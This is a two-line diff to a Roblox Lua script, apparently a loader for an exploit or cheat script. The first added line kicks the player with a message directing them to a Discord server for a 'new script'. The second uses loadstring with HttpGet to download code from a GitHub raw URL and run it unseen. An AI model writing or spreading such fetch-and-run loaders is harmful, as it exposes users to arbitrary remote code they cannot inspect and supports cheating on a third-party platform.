@@ -1,0 +1,2 @@
+game.Players.LocalPlayer:Kick("Please Get New Script, Please Check And Try Again Later: https://discord.gg/FcEGmkNDDe")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
